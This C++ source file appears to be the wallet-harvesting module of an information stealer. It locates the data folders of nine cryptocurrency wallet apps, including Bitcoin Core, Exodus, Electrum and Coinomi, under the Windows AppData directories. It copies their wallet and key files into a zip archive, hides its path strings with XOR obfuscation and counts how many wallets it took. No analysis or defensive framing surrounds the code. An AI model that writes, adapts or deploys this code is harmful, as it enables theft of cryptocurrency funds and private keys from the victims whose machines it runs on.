#include "wallets.h"
#include "../../winapi/winapi.h"

#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/globals/globals.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../../utilities/directories/directories.h"

#include <fstream>
#include <filesystem>

wallets g_wallets;

void wallets::exodus_app(std::string path)
{
	std::string wallet_dir = path.c_str() + std::string(XOR_STRING("exodus.wallet\\"));
	std::string from = path.c_str() + std::string(XOR_STRING("exodus.conf.json"));
	std::string file_name = std::string(XOR_STRING("Wallets/Exodus/")) + std::string(XOR_STRING("exodus.conf.json"));
	std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

	g_zip.write_zip(file_name.c_str(), buffer);

	for (auto &p : std::filesystem::directory_iterator(wallet_dir.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".seco"))
		{
			std::string from = wallet_dir.c_str() + p.path().stem().string() + std::string(XOR_STRING(".seco"));
			std::string file_name = std::string(XOR_STRING("Wallets/Exodus/exodus.wallet/")) + p.path().stem().string() + std::string(XOR_STRING(".seco"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void wallets::bitcoin_core_app(std::string path)
{
	int i = 0;

	for (auto &p : std::filesystem::recursive_directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".dat"))
		{
			i++;

			std::string from = p.path().string().c_str();
			std::string file_name = std::string(XOR_STRING("Wallets/Bitcoin Core/")) + std::string(XOR_STRING("#")) +
				std::to_string(i) + std::string(1, ' ') + p.path().filename().string().c_str();
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void wallets::armory_app(std::string path)
{
	std::string db_dir = path.c_str() + std::string(XOR_STRING("databases\\"));
	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".wallet"))
		{
			std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".wallet"));
			std::string file_name = std::string(XOR_STRING("Wallets/Armory Wallet/")) + p.path().stem().string() + std::string(XOR_STRING(".wallet"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}

		if (p.path().extension() == XOR_STRING(".lmdb"))
		{
			std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".lmdb"));
			std::string file_name = std::string(XOR_STRING("Wallets/Armory Wallet/")) + p.path().stem().string() + std::string(XOR_STRING(".lmdb"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}

		if (p.path().extension() == XOR_STRING(".lmdb-lock"))
		{
			std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".lmdb-lock"));
			std::string file_name = std::string(XOR_STRING("Wallets/Armory Wallet/")) + p.path().stem().string() + std::string(XOR_STRING(".lmdb-lock"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}

	for (auto &p : std::filesystem::directory_iterator(db_dir.c_str()))
	{
		std::string from = db_dir.c_str() + p.path().stem().string();
		std::string file_name = std::string(XOR_STRING("Wallets/Armory Wallet/databases/")) + p.path().stem().string();
		std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

		g_zip.write_zip(file_name.c_str(), buffer);
	}
}

void wallets::atomic_app(std::string path)
{
	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		std::string from = path.c_str() + p.path().filename().string();
		std::string file_name = std::string(XOR_STRING("Wallets/Atomic Wallet/leveldb/")) + p.path().filename().string();
		std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

		g_zip.write_zip(file_name.c_str(), buffer);
	}
}

void wallets::bytecoin_app(std::string path)
{
	std::string blockchain_dir = path.c_str() + std::string(XOR_STRING("blockchain\\"));
	std::string peer_db_dir = path.c_str() + std::string(XOR_STRING("peer_db\\"));

	for (auto &p : std::filesystem::directory_iterator(blockchain_dir.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".mdb"))
		{
			std::string from = blockchain_dir.c_str() + p.path().stem().string() + std::string(XOR_STRING(".mdb"));
			std::string file_name = std::string(XOR_STRING("Wallets/Bytecoin/blockchain/")) + p.path().stem().string() + std::string(XOR_STRING(".mdb"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}

	for (auto &p : std::filesystem::directory_iterator(peer_db_dir.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".mdb"))
		{
			std::string from = peer_db_dir.c_str() + p.path().stem().string() + std::string(XOR_STRING(".mdb"));
			std::string file_name = std::string(XOR_STRING("Wallets/Bytecoin/peer_db/")) + p.path().stem().string() + std::string(XOR_STRING(".mdb"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void wallets::dash_core_app(std::string path)
{
	int i = 0;

	for (auto &p : std::filesystem::recursive_directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".dat"))
		{
			i++;

			std::string from = p.path().string().c_str();
			std::string file_name = std::string(XOR_STRING("Wallets/DashCore/")) + std::string(XOR_STRING("#")) +
				std::to_string(i) + std::string(1, ' ') + p.path().filename().string().c_str();
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void wallets::electrum_app(std::string path)
{
	std::string wallets_dir = path.c_str() + std::string(XOR_STRING("wallets\\"));
	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (p.path().stem() == XOR_STRING("config"))
		{
			std::string from = path.c_str() + p.path().stem().string();
			std::string file_name = std::string(XOR_STRING("Wallets/Electrum/")) + p.path().stem().string();
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}

	for (auto &p : std::filesystem::directory_iterator(wallets_dir.c_str()))
	{
		std::string from = wallets_dir.c_str() + p.path().stem().string();
		std::string file_name = std::string(XOR_STRING("Wallets/Electrum/wallets/")) + p.path().stem().string();
		std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

		g_zip.write_zip(file_name.c_str(), buffer);
	}
}

void wallets::litecoin_app(std::string path)
{
	int i = 0;

	for (auto &p : std::filesystem::recursive_directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".dat"))
		{
			i++;

			std::string from = p.path().string().c_str();
			std::string file_name = std::string(XOR_STRING("Wallets/Litecoin/")) + std::string(XOR_STRING("#")) +
				std::to_string(i) + std::string(1, ' ') + p.path().filename().string().c_str();
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void wallets::coinomi_app(std::string path)
{
	std::string wallets_dir = path.c_str() + std::string(XOR_STRING("wallets\\"));
	for (auto &p : std::filesystem::directory_iterator(wallets_dir.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".wallet"))
		{
			std::string from = wallets_dir.c_str() + p.path().stem().string() + std::string(XOR_STRING(".wallet"));
			std::string file_name = std::string(XOR_STRING("Wallets/Coinomi/wallets/")) + p.path().stem().string() + std::string(XOR_STRING(".wallet"));
			std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

			g_zip.write_zip(file_name.c_str(), buffer);
		}
	}
}

void wallets::run()
{
	std::string bitcoin_core_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("Bitcoin\\wallets")) + std::string(XOR_STRING("\\"));
	std::string exodus_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("Exodus")) + std::string(XOR_STRING("\\"));
	std::string armorywallet_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("Armory")) + std::string(XOR_STRING("\\"));
	std::string atomicwallet_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("atomic\\Local Storage\\leveldb")) + std::string(XOR_STRING("\\"));
	std::string bytecoin_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("bytecoin")) + std::string(XOR_STRING("\\"));
	std::string dashcore_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("DashCore\\wallets")) + std::string(XOR_STRING("\\"));
	std::string electrum_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("Electrum")) + std::string(XOR_STRING("\\"));
	std::string litecoin_dir = g_dir.get_roaming_appdata().c_str() + std::string(XOR_STRING("Litecoin\\wallets")) + std::string(XOR_STRING("\\"));
	std::string coinomi_dir = g_dir.get_local_appdata().c_str() + std::string(XOR_STRING("Coinomi\\Coinomi")) + std::string(XOR_STRING("\\"));

	if (g_tools.check_directory(bitcoin_core_dir.c_str()) == DIR_FOUNDED)
	{
		bitcoin_core_app(bitcoin_core_dir.c_str());
		g_globals.wallets_count++;
	}

	if (g_tools.check_directory(exodus_dir.c_str()) == DIR_FOUNDED)
	{
		exodus_app(exodus_dir.c_str());
		g_globals.wallets_count++;
	}

	if (g_tools.check_directory(armorywallet_dir.c_str()) == DIR_FOUNDED)
	{
		armory_app(armorywallet_dir.c_str());
		g_globals.wallets_count++;
	}

	if (g_tools.check_directory(atomicwallet_dir.c_str()) == DIR_FOUNDED)
	{
		atomic_app(atomicwallet_dir.c_str());
		g_globals.wallets_count++;
	}

	if (g_tools.check_directory(bytecoin_dir.c_str()) == DIR_FOUNDED)
	{
		bytecoin_app(bytecoin_dir.c_str());
		g_globals.wallets_count++;
	}

	if (g_tools.check_directory(dashcore_dir.c_str()) == DIR_FOUNDED)
	{
		dash_core_app(dashcore_dir.c_str());
		g_globals.wallets_count++;
	}	

	if (g_tools.check_directory(electrum_dir.c_str()) == DIR_FOUNDED)
	{
		electrum_app(electrum_dir.c_str());
		g_globals.wallets_count++;
	}
	
	if (g_tools.check_directory(litecoin_dir.c_str()) == DIR_FOUNDED)
	{
		litecoin_app(litecoin_dir.c_str());
		g_globals.wallets_count++;
	}

	if (g_tools.check_directory(coinomi_dir.c_str()) == DIR_FOUNDED)
	{
		coinomi_app(coinomi_dir.c_str());
		g_globals.wallets_count++;
	}
}